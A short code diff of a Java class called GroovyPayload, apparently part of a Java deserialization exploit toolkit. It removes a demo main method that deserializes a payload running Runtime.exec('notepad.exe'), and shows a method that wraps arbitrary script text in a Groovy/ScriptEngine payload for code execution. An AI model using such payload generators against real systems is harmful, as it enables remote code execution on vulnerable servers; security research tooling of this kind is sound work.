@@ -9,10 +9,6 @@ import java.util.Comparator;
 import java.util.PriorityQueue;
 
 public class GroovyPayload implements ScriptEngineEvaluator, GroovyExpressionEvaluator {
-    public static void main(String[] args) {
-        Util.deserialize(new GroovyPayload().generateJavaScriptPayload("java.lang.Runtime.getRuntime().exec(\"notepad.exe\");"));
-    }
-
     @Override
     public byte[] generateScriptPayload(String scriptText, String scriptType) {
         return this.generateGroovyPayload(String.format("new javax.script.ScriptEngineManager().getEngineByExtension('%s').eval('%s')", scriptType, scriptText));
